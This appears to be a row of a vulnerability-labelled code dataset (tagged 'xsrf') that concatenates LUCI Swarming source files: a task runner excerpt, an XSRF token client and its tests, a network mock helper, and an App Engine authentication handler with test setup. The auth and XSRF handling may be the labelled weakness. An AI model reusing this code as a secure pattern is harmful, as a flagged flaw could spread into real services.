          params['hard_timeout'] = had_hard_timeout
          if not had_io_timeout and not had_hard_timeout:
            if run_isolated_result['internal_failure']:
              must_signal_internal_failure = (
                  run_isolated_result['internal_failure'])
              logging.error('%s', must_signal_internal_failure)
            elif exit_code:
              # TODO(maruel): Grab stdout from run_isolated.
              must_signal_internal_failure = (
                  'run_isolated internal failure %d' % exit_code)
              logging.error('%s', must_signal_internal_failure)
          exit_code = run_isolated_result['exit_code']
          if run_isolated_result.get('duration') is not None:
            # Calculate the real task duration as measured by run_isolated and
            # calculate the remaining overhead.
            params['bot_overhead'] = params['duration']
            params['duration'] = run_isolated_result['duration']
            params['bot_overhead'] -= params['duration']
            params['bot_overhead'] -= run_isolated_result.get(
                'download', {}).get('duration', 0)
            params['bot_overhead'] -= run_isolated_result.get(
                'upload', {}).get('duration', 0)
            if params['bot_overhead'] < 0:
              params['bot_overhead'] = 0
          stats = run_isolated_result.get('stats')
          if stats:
            params['isolated_stats'] = stats
      except (IOError, OSError, ValueError) as e:
        logging.error('Swallowing error: %s', e)
        if not must_signal_internal_failure:
          must_signal_internal_failure = str(e)
    # TODO(maruel): Send the internal failure here instead of sending it through
    # bot_main, this causes a race condition.
    if exit_code is None:
      exit_code = -1
    post_update(swarming_server, params, exit_code, stdout, output_chunk_start)
    return {
      u'exit_code': exit_code,
      u'hard_timeout': had_hard_timeout,
      u'io_timeout': had_io_timeout,
      u'must_signal_internal_failure': must_signal_internal_failure,
      u'version': OUT_VERSION,
    }
  finally:
    if isolated_result:
      try:
        os.remove(isolated_result)
      except OSError:
        pass


def main(args):
  parser = optparse.OptionParser(description=sys.modules[__name__].__doc__)
  parser.add_option('--in-file', help='Name of the request file')
  parser.add_option(
      '--out-file', help='Name of the JSON file to write a task summary to')
  parser.add_option(
      '--swarming-server', help='Swarming server to send data back')
  parser.add_option(
      '--cost-usd-hour', type='float', help='Cost of this VM in $/h')
  parser.add_option('--start', type='float', help='Time this task was started')
  parser.add_option(
      '--min-free-space', type='int',
      help='Value to send down to run_isolated')

  options, args = parser.parse_args(args)
  if not options.in_file or not options.out_file or args:
    parser.error('task_runner is meant to be used by swarming_bot.')

  on_error.report_on_exception_exit(options.swarming_server)

  logging.info('starting')
  remote = xsrf_client.XsrfRemote(options.swarming_server)

  now = monotonic_time()
  if options.start > now:
    options.start = now

  try:
    load_and_run(
        options.in_file, remote, options.cost_usd_hour, options.start,
        options.out_file, options.min_free_space)
    return 0
  finally:
    logging.info('quitting')
/n/n/n/appengine/swarming/swarming_bot/bot_code/xsrf_client.py/n/n# Copyright 2013 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

""""""Wraps URL requests with an XSRF token using components/auth based service.""""""

import datetime
import logging
import os
import sys

THIS_DIR = os.path.dirname(os.path.abspath(__file__))

sys.path.insert(0, os.path.join(THIS_DIR, 'third_party'))

from utils import net


class Error(Exception):
  pass


def _utcnow():
  """"""So it can be mocked.""""""
  return datetime.datetime.utcnow()


class XsrfRemote(object):
  """"""Transparently adds XSRF token to requests.""""""
  TOKEN_RESOURCE = '/auth/api/v1/accounts/self/xsrf_token'

  def __init__(self, url, token_resource=None):
    self.url = url.rstrip('/')
    self.token = None
    self.token_resource = token_resource or self.TOKEN_RESOURCE
    self.expiration = None
    self.xsrf_request_params = {}

  def url_read(self, resource, **kwargs):
    url = self.url + resource
    if kwargs.get('data') == None:
      # No XSRF token for GET.
      return net.url_read(url, **kwargs)

    if self.need_refresh():
      self.refresh_token()
    resp = self._url_read_post(url, **kwargs)
    if resp is None:
      raise Error('Failed to connect to %s; %s' % (url, self.expiration))
    return resp

  def url_read_json(self, resource, **kwargs):
    url = self.url + resource
    if kwargs.get('data') == None:
      # No XSRF token required for GET.
      return net.url_read_json(url, **kwargs)

    if self.need_refresh():
      self.refresh_token()
    resp = self._url_read_json_post(url, **kwargs)
    if resp is None:
      raise Error('Failed to connect to %s; %s' % (url, self.expiration))
    return resp

  def refresh_token(self):
    """"""Returns a fresh token. Necessary as the token may expire after an hour.
    """"""
    url = self.url + self.token_resource
    resp = net.url_read_json(
        url,
        headers={'X-XSRF-Token-Request': '1'},
        data=self.xsrf_request_params)
    if resp is None:
      raise Error('Failed to connect to %s' % url)
    self.token = resp['xsrf_token']
    if resp.get('expiration_sec'):
      exp = resp['expiration_sec']
      exp -= min(round(exp * 0.1), 600)
      self.expiration = _utcnow() + datetime.timedelta(seconds=exp)
    return self.token

  def need_refresh(self):
    """"""Returns True if the XSRF token needs to be refreshed.""""""
    return (
        not self.token or (self.expiration and self.expiration <= _utcnow()))

  def _url_read_post(self, url, **kwargs):
    headers = (kwargs.pop('headers', None) or {}).copy()
    headers['X-XSRF-Token'] = self.token
    return net.url_read(url, headers=headers, **kwargs)

  def _url_read_json_post(self, url, **kwargs):
    headers = (kwargs.pop('headers', None) or {}).copy()
    headers['X-XSRF-Token'] = self.token
    return net.url_read_json(url, headers=headers, **kwargs)
/n/n/n/appengine/swarming/swarming_bot/bot_code/xsrf_client_test.py/n/n#!/usr/bin/env python
# Copyright 2013 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

import datetime
import logging
import os
import sys
import time
import unittest

import test_env_bot_code
test_env_bot_code.setup_test_env()

# Creates a server mock for functions in net.py.
import net_utils

import xsrf_client


class UrlHelperTest(net_utils.TestCase):
  def setUp(self):
    super(UrlHelperTest, self).setUp()
    self.mock(logging, 'error', lambda *_: None)
    self.mock(logging, 'exception', lambda *_: None)
    self.mock(logging, 'info', lambda *_: None)
    self.mock(logging, 'warning', lambda *_: None)
    self.mock(time, 'sleep', lambda _: None)

  def testXsrfRemoteGET(self):
    self.expected_requests([('http://localhost/a', {}, 'foo', None)])

    remote = xsrf_client.XsrfRemote('http://localhost/')
    self.assertEqual('foo', remote.url_read('/a'))

  def testXsrfRemoteSimple(self):
    self.expected_requests(
        [
          (
            'http://localhost/auth/api/v1/accounts/self/xsrf_token',
            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},
            {
              'expiration_sec': 100,
              'xsrf_token': 'token',
            },
          ),
          (
            'http://localhost/a',
            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token'}},
            'foo',
            None,
          ),
        ])

    remote = xsrf_client.XsrfRemote('http://localhost/')
    self.assertEqual('foo', remote.url_read('/a', data={'foo': 'bar'}))

  def testXsrfRemoteRefresh(self):
    self.expected_requests(
        [
          (
            'http://localhost/auth/api/v1/accounts/self/xsrf_token',
            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},
            {
              'expiration_sec': 100,
              'xsrf_token': 'token',
            },
          ),
          (
            'http://localhost/a',
            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token'}},
            'bar',
            None,
          ),
          (
            'http://localhost/auth/api/v1/accounts/self/xsrf_token',
            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},
            {
              'expiration_sec': 100,
              'xsrf_token': 'token2',
            },
          ),
          (
            'http://localhost/a',
            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token2'}},
            'foo',
            None,
          ),
        ])

    now = xsrf_client._utcnow()
    remote = xsrf_client.XsrfRemote('http://localhost/')
    remote.url_read('/a', data={'foo': 'bar'})
    self.mock(
        xsrf_client, '_utcnow', lambda: now + datetime.timedelta(seconds=91))
    remote.url_read('/a', data={'foo': 'bar'})

  def testXsrfRemoteCustom(self):
    # Use the new swarming bot API as an example of custom XSRF request handler.
    self.expected_requests(
        [
          (
            'http://localhost/swarming/api/v1/bot/handshake',
            {
              'data': {'attributes': 'b'},
              'headers': {'X-XSRF-Token-Request': '1'},
            },
            {
              'expiration_sec': 100,
              'ignored': True,
              'xsrf_token': 'token',
            },
          ),
          (
            'http://localhost/a',
            {'data': {'foo': 'bar'}, 'headers': {'X-XSRF-Token': 'token'}},
            'foo',
            None,
          ),
        ])

    remote = xsrf_client.XsrfRemote(
        'http://localhost/',
        '/swarming/api/v1/bot/handshake')
    remote.xsrf_request_params = {'attributes': 'b'}
    self.assertEqual('foo', remote.url_read('/a', data={'foo': 'bar'}))


if __name__ == '__main__':
  logging.basicConfig(level=logging.ERROR)
  unittest.main()
/n/n/n/client/tests/net_utils.py/n/n# Copyright 2014 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

import logging
import os
import sys
import threading

TEST_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.dirname(TEST_DIR)
sys.path.insert(0, ROOT_DIR)
sys.path.insert(0, os.path.join(ROOT_DIR, 'third_party'))

from depot_tools import auto_stub
from utils import net


def make_fake_response(content, url, headers=None):
  """"""Returns HttpResponse with predefined content, useful in tests.""""""
  headers = dict(headers or {})
  headers['Content-Length'] = len(content)
  class _Fake(object):
    def __init__(self):
      self.content = content
    def iter_content(self, chunk_size):
      c = self.content
      while c:
        yield c[:chunk_size]
        c = c[chunk_size:]
    def read(self):
      return self.content
  return net.HttpResponse(_Fake(), url, headers)


class TestCase(auto_stub.TestCase):
  """"""Mocks out url_open() calls.""""""
  def setUp(self):
    super(TestCase, self).setUp()
    self.mock(net, 'url_open', self._url_open)
    self.mock(net, 'url_read_json', self._url_read_json)
    self.mock(net, 'sleep_before_retry', lambda *_: None)
    self._lock = threading.Lock()
    self._requests = []

  def tearDown(self):
    try:
      if not self.has_failed():
        self.assertEqual([], self._requests)
    finally:
      super(TestCase, self).tearDown()

  def expected_requests(self, requests):
    """"""Registers the expected requests along their reponses.

    Arguments:
      request: list of tuple(url, kwargs, response, headers) for normal requests
          and tuple(url, kwargs, response) for json requests. kwargs can be a
          callable. In that case, it's called with the actual kwargs. It's
          useful when the kwargs values are not deterministic.
    """"""
    requests = requests[:]
    for request in requests:
      self.assertEqual(tuple, request.__class__)
      # 3 = json request (url_read_json).
      # 4 = normal request (url_open).
      self.assertIn(len(request), (3, 4))

    with self._lock:
      self.assertEqual([], self._requests)
      self._requests = requests

  def _url_open(self, url, **kwargs):
    logging.warn('url_open(%s, %s)', url[:500], str(kwargs)[:500])
    with self._lock:
      if not self._requests:
        return None
      # Ignore 'stream' argument, it's not important for these tests.
      kwargs.pop('stream', None)
      for i, n in enumerate(self._requests):
        if n[0] == url:
          data = self._requests.pop(i)
          if len(data) != 4:
            self.fail('Expected normal request, got json data; %s' % url)
          _, expected_kwargs, result, headers = data
          if callable(expected_kwargs):
            expected_kwargs(kwargs)
          else:
            self.assertEqual(expected_kwargs, kwargs)
          if result is not None:
            return make_fake_response(result, url, headers)
          return None
    self.fail('Unknown request %s' % url)

  def _url_read_json(self, url, **kwargs):
    logging.warn('url_read_json(%s, %s)', url[:500], str(kwargs)[:500])
    with self._lock:
      if not self._requests:
        return None
      # Ignore 'stream' argument, it's not important for these tests.
      kwargs.pop('stream', None)
      for i, n in enumerate(self._requests):
        if n[0] == url:
          data = self._requests.pop(i)
          if len(data) != 3:
            self.fail('Expected json request, got normal data; %s' % url)
          _, expected_kwargs, result = data
          if callable(expected_kwargs):
            expected_kwargs(kwargs)
          else:
            self.assertEqual(expected_kwargs, kwargs)
          if result is not None:
            return result
          return None
    self.fail('Unknown request %s' % url)
/n/n/n",1,xsrf
10,80,0ba6a589d77baefc5ae20cde5c3a5dc24a6290f9,"appengine/components/components/auth/handler.py/n/n# Copyright 2014 The Swarming Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

""""""Integration with webapp2.""""""

# Disable 'Method could be a function.'
# pylint: disable=R0201

import functools
import json
import logging
import urllib
import webapp2

from google.appengine.api import urlfetch
from google.appengine.api import users

from components import utils

from . import api
from . import config
from . import delegation
from . import host_token
from . import ipaddr
from . import model
from . import openid
from . import tokens

# Part of public API of 'auth' component, exposed by this module.
__all__ = [
  'ApiHandler',
  'AuthenticatingHandler',
  'gae_cookie_authentication',
  'get_authenticated_routes',
  'oauth_authentication',
  'openid_cookie_authentication',
  'require_xsrf_token_request',
  'service_to_service_authentication',
]


def require_xsrf_token_request(f):
  """"""Use for handshaking APIs.""""""
  @functools.wraps(f)
  def hook(self, *args, **kwargs):
    if not self.request.headers.get('X-XSRF-Token-Request'):
      raise api.AuthorizationError('Missing required XSRF request header')
    return f(self, *args, **kwargs)
  return hook


class XSRFToken(tokens.TokenKind):
  """"""XSRF token parameters.""""""
  expiration_sec = 4 * 3600
  secret_key = api.SecretKey('xsrf_token', scope='local')
  version = 1


class AuthenticatingHandlerMetaclass(type):
  """"""Ensures that 'get', 'post', etc. are marked with @require or @public.""""""

  def __new__(mcs, name, bases, attributes):
    for method in webapp2.WSGIApplication.allowed_methods:
      func = attributes.get(method.lower())
      if func and not api.is_decorated(func):
        raise TypeError(
            'Method \'%s\' of \'%s\' is not protected by @require or @public '
            'decorator' % (method.lower(), name))
    return type.__new__(mcs, name, bases, attributes)


class AuthenticatingHandler(webapp2.RequestHandler):
  """"""Base class for webapp2 request handlers that use Auth system.

  Knows how to extract Identity from request data and how to initialize auth
  request context, so that get_current_identity() and is_group_member() work.

  All request handling methods (like 'get', 'post', etc) should be marked by
  either @require or @public decorators.
  """"""

  # Checks that all 'get', 'post', etc. are marked with @require or @public.
  __metaclass__ = AuthenticatingHandlerMetaclass

  # List of HTTP methods that trigger XSRF token validation.
  xsrf_token_enforce_on = ('DELETE', 'POST', 'PUT')
  # If not None, the header to search for XSRF token.
  xsrf_token_header = 'X-XSRF-Token'
  # If not None, the request parameter (GET or POST) to search for XSRF token.
  xsrf_token_request_param = 'xsrf_token'
  # Embedded data extracted from XSRF token of current request.
  xsrf_token_data = None
  # If not None, sets X_Frame-Options on all replies.
  frame_options = 'DENY'
  # A method used to authenticate this request, see get_auth_methods().
  auth_method = None

  def dispatch(self):
    """"""Extracts and verifies Identity, sets up request auth context.""""""
    # Ensure auth component is configured before executing any code.
    conf = config.ensure_configured()
    auth_context = api.reinitialize_request_cache()

    # http://www.html5rocks.com/en/tutorials/security/content-security-policy/
    # https://www.owasp.org/index.php/Content_Security_Policy
    # TODO(maruel): Remove 'unsafe-inline' once all inline style=""foo:bar"" in
    # all HTML tags were removed. Warning if seeing this post 2016, it could
    # take a while.
    # - https://www.google.com is due to Google Viz library.
    # - https://www.google-analytics.com due to Analytics.
    # - 'unsafe-eval' due to polymer.
    self.response.headers['Content-Security-Policy'] = (
        'default-src https: \'self\' \'unsafe-inline\' https://www.google.com '
        'https://www.google-analytics.com \'unsafe-eval\'')
    # Enforce HTTPS by adding the HSTS header; 365*24*60*60s.
    # https://www.owasp.org/index.php/HTTP_Strict_Transport_Security
    self.response.headers['Strict-Transport-Security'] = (
        'max-age=31536000; includeSubDomains; preload')
    # Disable frame support wholesale.
    # https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet
    if self.frame_options:
      self.response.headers['X-Frame-Options'] = self.frame_options

    identity = None
    for method_func in self.get_auth_methods(conf):
      try:
        identity = method_func(self.request)
        if identity:
          break
      except api.AuthenticationError as err:
        self.authentication_error(err)
        return
      except api.AuthorizationError as err:
        self.authorization_error(err)
        return
    else:
      method_func = None
    self.auth_method = method_func

    # If no authentication method is applicable, default to anonymous identity.
    identity = identity or model.Anonymous

    # XSRF token is required only if using Cookie based or IP whitelist auth.
    # A browser doesn't send Authorization: 'Bearer ...' or any other headers
    # by itself. So XSRF check is not required if header based authentication
    # is used.
    using_headers_auth = method_func in (
        oauth_authentication, service_to_service_authentication)

    # Extract caller host name from host token header, if present and valid.
    host_tok = self.request.headers.get(host_token.HTTP_HEADER)
    if host_tok:
      validated_host = host_token.validate_host_token(host_tok)
      if validated_host:
        auth_context.peer_host = validated_host

    # Verify IP is whitelisted and authenticate requests from bots.
    assert self.request.remote_addr
    ip = ipaddr.ip_from_string(self.request.remote_addr)
    auth_context.peer_ip = ip
    try:
      # 'verify_ip_whitelisted' may change identity for bots, store new one.
      auth_context.peer_identity = api.verify_ip_whitelisted(
          identity, ip, self.request.headers)
    except api.AuthorizationError as err:
      self.authorization_error(err)
      return

    # Parse delegation token, if given, to deduce end-user identity.
    delegation_tok = self.request.headers.get(delegation.HTTP_HEADER)
    if delegation_tok:
      try:
        auth_context.current_identity = delegation.check_delegation_token(
            delegation_tok, auth_context.peer_identity)
      except delegation.BadTokenError as exc:
        self.authorization_error(
            api.AuthorizationError('Bad delegation token: %s' % exc))
      except delegation.TransientError as exc:
        msg = 'Transient error while validating delegation token.\n%s' % exc
        logging.error(msg)
        self.abort(500, detail=msg)
    else:
      auth_context.current_identity = auth_context.peer_identity

    try:
      # Fail if XSRF token is required, but not provided.
      need_xsrf_token = (
          not using_headers_auth and
          self.request.method in self.xsrf_token_enforce_on)
      if need_xsrf_token and self.xsrf_token is None:
        raise api.AuthorizationError('XSRF token is missing')

      # If XSRF token is present, verify it is valid and extract its payload.
      # Do it even if XSRF token is not strictly required, since some handlers
      # use it to store session state (it is similar to a signed cookie).
      self.xsrf_token_data = {}
      if self.xsrf_token is not None:
        # This raises AuthorizationError if token is invalid.
        try:
          self.xsrf_token_data = self.verify_xsrf_token()
        except api.AuthorizationError as exc:
          if not need_xsrf_token:
            logging.warning('XSRF token is broken, ignoring - %s', exc)
          else:
            raise

      # All other ACL checks will be performed by corresponding handlers
      # manually or via '@required' decorator. Failed ACL check raises
      # AuthorizationError.
      super(AuthenticatingHandler, self).dispatch()
    except api.AuthorizationError as err:
      self.authorization_error(err)

  @classmethod
  def get_auth_methods(cls, conf):
    """"""Returns an enumerable of functions to use to authenticate request.

    The handler will try to apply auth methods sequentially one by one by until
    it finds one that works.

    Each auth method is a function that accepts webapp2.Request and can finish
    with 3 outcomes:

    * Return None: authentication method is not applicable to that request
      and next method should be tried (for example cookie-based
      authentication is not applicable when there's no cookies).

    * Returns Identity associated with the request. Means authentication method
      is applicable and request authenticity is confirmed.

    * Raises AuthenticationError: authentication method is applicable, but
      request contains bad credentials or invalid token, etc. For example,
      OAuth2 token is given, but it is revoked.

    A chosen auth method function will be stored in request's auth_method field.

    Args:
      conf: components.auth GAE config, see config.py.
    """"""
    if conf.USE_OPENID:
      cookie_auth = openid_cookie_authentication
    else:
      cookie_auth = gae_cookie_authentication
    return oauth_authentication, cookie_auth, service_to_service_authentication

  def generate_xsrf_token(self, xsrf_token_data=None):
    """"""Returns new XSRF token that embeds |xsrf_token_data|.

    The token is bound to current identity and is valid only when used by same
    identity.
    """"""
    return XSRFToken.generate(
        [api.get_current_identity().to_bytes()], xsrf_token_data)

  @property
  def xsrf_token(self):
    """"""Returns XSRF token passed with the request or None if missing.

    Doesn't do any validation. Use verify_xsrf_token() instead.
    """"""
    token = None
    if self.xsrf_token_header:
      token = self.request.headers.get(self.xsrf_token_header)
    if not token and self.xsrf_token_request_param:
      param = self.request.get_all(self.xsrf_token_request_param)
      token = param[0] if param else None
    return token

  def verify_xsrf_token(self):
    """"""Grabs a token from the request, validates it and extracts embedded data.

    Current identity must be the same as one used to generate the token.

    Returns:
      Whatever was passed as |xsrf_token_data| in 'generate_xsrf_token'
      method call used to generate the token.

    Raises:
      AuthorizationError if token is missing, invalid or expired.
    """"""
    token = self.xsrf_token
    if not token:
      raise api.AuthorizationError('XSRF token is missing')
    # Check that it was generated for the same identity.
    try:
      return XSRFToken.validate(token, [api.get_current_identity().to_bytes()])
    except tokens.InvalidTokenError as err:
      raise api.AuthorizationError(str(err))

  def authentication_error(self, error):
    """"""Called when authentication fails to report the error to requester.

    Authentication error means that some credentials are provided but they are
    invalid. If no credentials are provided at all, no authentication is
    attempted and current identity is just set to 'anonymous:anonymous'.

    Default behavior is to abort the request with HTTP 401 error (and human
    readable HTML body).

    Args:
      error: instance of AuthenticationError subclass.
    """"""
    logging.warning('Authentication error.\n%s', error)
    self.abort(401, detail=str(error))

  def authorization_error(self, error):
    """"""Called when authentication succeeds, but access to a resource is denied.

    Called whenever request handler raises AuthorizationError exception.
    In particular this exception is raised by method decorated with @require if
    current identity doesn't have required permission.

    Default behavior is to abort the request with HTTP 403 error (and human
    readable HTML body).

    Args:
      error: instance of AuthorizationError subclass.
    """"""
    logging.warning(
        'Authorization error.\n%s\nPeer: %s\nIP: %s',
        error, api.get_peer_identity().to_bytes(), self.request.remote_addr)
    self.abort(403, detail=str(error))

  ### Wrappers around Users API or its OpenID equivalent.

  def get_current_user(self):
    """"""When cookie auth is used returns instance of CurrentUser or None.""""""
    return self._get_users_api().get_current_user(self.request)

  def is_current_user_gae_admin(self):
    """"""When cookie auth is used returns True if current caller is GAE admin.""""""
    return self._get_users_api().is_current_user_gae_admin(self.request)

  def create_login_url(self, dest_url):
    """"""When cookie auth is used returns URL to redirect user to login.""""""
    return self._get_users_api().create_login_url(self.request, dest_url)

  def create_logout_url(self, dest_url):
    """"""When cookie auth is used returns URL to redirect user to logout.""""""
    return self._get_users_api().create_logout_url(self.request, dest_url)

  def _get_users_api(self):
    """"""Returns GAEUsersAPI, OpenIDAPI or raises NotImplementedError.

    Chooses based on what auth_method was used of what methods are available.
    """"""
    method = self.auth_method
    if not method:
      # Anonymous request -> pick first method that supports API.
      for method in self.get_auth_methods(config.ensure_configured()):
        if method in _METHOD_TO_USERS_API:
          break
      else:
        raise NotImplementedError('No methods support UsersAPI')
    elif method not in _METHOD_TO_USERS_API:
      raise NotImplementedError(
          '%s doesn\'t support UsersAPI' % method.__name__)
    return _METHOD_TO_USERS_API[method]


class ApiHandler(AuthenticatingHandler):
  """"""Parses JSON request body to a dict, serializes response to JSON.""""""
  CONTENT_TYPE_BASE = 'application/json'
  CONTENT_TYPE_FULL = 'application/json; charset=utf-8'
  _json_body = None
  # Clickjacking not applicable to APIs.
  frame_options = None

  def authentication_error(self, error):
    logging.warning('Authentication error.\n%s', error)
    self.abort_with_error(401, text=str(error))

  def authorization_error(self, error):
    logging.warning(
        'Authorization error.\n%s\nPeer: %s\nIP: %s',
        error, api.get_peer_identity().to_bytes(), self.request.remote_addr)
    self.abort_with_error(403, text=str(error))

  def send_response(self, response, http_code=200, headers=None):
    """"""Sends successful reply and continues execution.""""""
    self.response.set_status(http_code)
    self.response.headers.update(headers or {})
    self.response.headers['Content-Type'] = self.CONTENT_TYPE_FULL
    self.response.write(json.dumps(response))

  def abort_with_error(self, http_code, **kwargs):
    """"""Sends error reply and stops execution.""""""
    self.abort(
        http_code,
        json=kwargs,
        headers={'Content-Type': self.CONTENT_TYPE_FULL})

  def parse_body(self):
    """"""Parses JSON body and verifies it's a dict.

    webob.Request doesn't cache the decoded json body, this function does.
    """"""
    if self._json_body is None:
      if (self.CONTENT_TYPE_BASE and
          self.request.content_type != self.CONTENT_TYPE_BASE):
        msg = (
            'Expecting JSON body with content type \'%s\'' %
            self.CONTENT_TYPE_BASE)
        self.abort_with_error(400, text=msg)
      try:
        self._json_body = self.request.json
        if not isinstance(self._json_body, dict):
          raise ValueError()
      except (LookupError, ValueError):
        self.abort_with_error(400, text='Not a valid json dict body')
    return self._json_body.copy()


def get_authenticated_routes(app):
  """"""Given WSGIApplication returns list of routes that use authentication.

  Intended to be used only for testing.
  """"""
  # This code is adapted from router's __repr__ method (that enumerate
  # all routes for pretty-printing).
  routes = list(app.router.match_routes)
  routes.extend(
      v for k, v in app.router.build_routes.iteritems()
      if v not in app.router.match_routes)
  return [r for r in routes if issubclass(r.handler, AuthenticatingHandler)]


################################################################################
## All supported implementations of authentication methods for webapp2 handlers.


def gae_cookie_authentication(_request):
  """"""AppEngine cookie based authentication via users.get_current_user().""""""
  user = users.get_current_user()
  try:
    return model.Identity(model.IDENTITY_USER, user.email()) if user else None
  except ValueError:
    raise api.AuthenticationError('Unsupported user email: %s' % user.email())


def openid_cookie_authentication(request):
  """"""Cookie based authentication that uses OpenID flow for login.""""""
  user = openid.get_current_user(request)
  try:
    return model.Identity(model.IDENTITY_USER, user.email) if user else None
  except ValueError:
    raise api.AuthenticationError('Unsupported user email: %s' % user.email)


def oauth_authentication(request):
  """"""OAuth2 based authentication via oauth.get_current_user().""""""
  if not request.headers.get('Authorization'):
    return None
  if not utils.is_local_dev_server():
    return api.extract_oauth_caller_identity()

  # OAuth2 library is mocked on dev server to return some nonsense. Use (slow,
  # but real) OAuth2 API endpoint instead to validate access_token. It is also
  # what Cloud Endpoints do on a local server. For simplicity ignore client_id
  # on dev server.
  header = request.headers['Authorization'].split(' ', 1)
  if len(header) != 2 or header[0] not in ('OAuth', 'Bearer'):
    raise api.AuthenticationError('Invalid authorization header')

  # Adapted from endpoints/users_id_tokens.py, _set_bearer_user_vars_local.
  base_url = 'https://www.googleapis.com/oauth2/v1/tokeninfo'
  result = urlfetch.fetch(
      url='%s?%s' % (base_url, urllib.urlencode({'access_token': header[1]})),
      follow_redirects=False,
      validate_certificate=True)
  if result.status_code != 200:
    try:
      error = json.loads(result.content)['error_description']
    except (KeyError, ValueError):
      error = repr(result.content)
    raise api.AuthenticationError('Failed to validate the token: %s' % error)

  token_info = json.loads(result.content)
  if 'email' not in token_info:
    raise api.AuthenticationError('Token doesn\'t include an email address')
  if not token_info.get('verified_email'):
    raise api.AuthenticationError('Token email isn\'t verified')

  email = token_info['email']
  try:
    return model.Identity(model.IDENTITY_USER, email)
  except ValueError:
    raise api.AuthenticationError('Unsupported user email: %s' % email)


def service_to_service_authentication(request):
  """"""Used for AppEngine <-> AppEngine communication.

  Relies on X-Appengine-Inbound-Appid header set by AppEngine itself. It can't
  be set by external users (with exception of admins).
  """"""
  app_id = request.headers.get('X-Appengine-Inbound-Appid')
  try:
    return model.Identity(model.IDENTITY_SERVICE, app_id) if app_id else None
  except ValueError:
    raise api.AuthenticationError('Unsupported application ID: %s' % app_id)


################################################################################
## API wrapper on top of Users API and OpenID API to make them similar.


class CurrentUser(object):
  """"""Mimics subset of GAE users.User object for ease of transition.

  Also adds .picture().
  """"""

  def __init__(self, user_id, email, picture):
    self._user_id = user_id
    self._email = email
    self._picture = picture

  def nickname(self):
    return self._email

  def email(self):
    return self._email

  def user_id(self):
    return self._user_id

  def picture(self):
    return self._picture

  def __unicode__(self):
    return unicode(self.nickname())

  def __str__(self):
    return str(self.nickname())


class GAEUsersAPI(object):
  @staticmethod
  def get_current_user(request):  # pylint: disable=unused-argument
    user = users.get_current_user()
    return CurrentUser(user.user_id(), user.email(), None) if user else None

  @staticmethod
  def is_current_user_gae_admin(request):  # pylint: disable=unused-argument
    return users.is_current_user_admin()

  @staticmethod
  def create_login_url(request, dest_url):  # pylint: disable=unused-argument
    return users.create_login_url(dest_url)

  @staticmethod
  def create_logout_url(request, dest_url):  # pylint: disable=unused-argument
    return users.create_logout_url(dest_url)


class OpenIDAPI(object):
  @staticmethod
  def get_current_user(request):
    user = openid.get_current_user(request)
    return CurrentUser(user.sub, user.email, user.picture) if user else None

  @staticmethod
  def is_current_user_gae_admin(request):  # pylint: disable=unused-argument
    return False

  @staticmethod
  def create_login_url(request, dest_url):
    return openid.create_login_url(request, dest_url)

  @staticmethod
  def create_logout_url(request, dest_url):
    return openid.create_logout_url(request, dest_url)


# See AuthenticatingHandler._get_users_api().
_METHOD_TO_USERS_API = {
  gae_cookie_authentication: GAEUsersAPI,
  openid_cookie_authentication: OpenIDAPI,
}
/n/n/nappengine/components/components/auth/handler_test.py/n/n#!/usr/bin/env python
# Copyright 2014 The Swarming Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

# Disable 'Unused variable', 'Unused argument' and 'Method could be a function'.
# pylint: disable=W0612,W0613,R0201

import datetime
import json
import os
import sys
import unittest

from test_support import test_env
test_env.setup_test_env()

from google.appengine.api import oauth
from google.appengine.api import users

import webapp2
import webtest

from components import utils
from components.auth import api
from components.auth import delegation
from components.auth import handler
from components.auth import host_token
from components.auth import ipaddr
from components.auth import model
from components.auth.proto import delegation_pb2
from test_support import test_case


class AuthenticatingHandlerMetaclassTest(test_case.TestCase):
  """"""Tests for AuthenticatingHandlerMetaclass.""""""

  def test_good(self):
    # No request handling methods defined at all.
    class TestHandler1(handler.AuthenticatingHandler):
      def some_other_method(self):
        pass

    # @public is used.
    class TestHandler2(handler.AuthenticatingHandler):
      @api.public
      def get(self):
        pass

    # @require is used.
    class TestHandler3(handler.AuthenticatingHandler):
      @api.require(lambda: True)
      def get(self):
        pass

  def test_bad(self):
    # @public or @require is missing.
    with self.assertRaises(TypeError):
      class TestHandler1(handler.AuthenticatingHandler):
        def get(self):
          pass


class AuthenticatingHandlerTest(test_case.TestCase):
  """"""Tests for AuthenticatingHandler class.""""""

  def setUp(self):
    super(AuthenticatingHandlerTest, self).setUp()
    # Reset global config of auth library before each test.
    api.reset_local_state()
    # Capture error and warning log messages.
    self.logged_errors = []
    self.mock(handler.logging, 'error',
        lambda *args, **kwargs: self.logged_errors.append((args, kwargs)))
    self.logged_warnings = []
    self.mock(handler.logging, 'warning',
        lambda *args, **kwargs: self.logged_warnings.append((args, kwargs)))

  def make_test_app(self, path, request_handler):
    """"""Returns webtest.TestApp with single route.""""""
    return webtest.TestApp(
        webapp2.WSGIApplication([(path, request_handler)], debug=True),
        extra_environ={'REMOTE_ADDR': '127.0.0.1'})

  def test_anonymous(self):
    """"""If all auth methods are not applicable, identity is set to Anonymous.""""""
    test = self

    class Handler(handler.AuthenticatingHandler):
      @classmethod
      def get_auth_methods(cls, conf):
        non_applicable = lambda _request: None
        return [non_applicable, non_applicable]

      @api.public
      def get(self):
        test.assertEqual(model.Anonymous, api.get_current_identity())
        self.response.write('OK')

    app = self.make_test_app('/request', Handler)
    self.assertEqual('OK', app.get('/request').body)

  def test_ip_whitelist_bot(self):
    """"""Requests from client in ""bots"" IP whitelist are authenticated as bot.""""""
    model.bootstrap_ip_whitelist('bots', ['192.168.1.100/32'])

    class Handler(handler.AuthenticatingHandler):
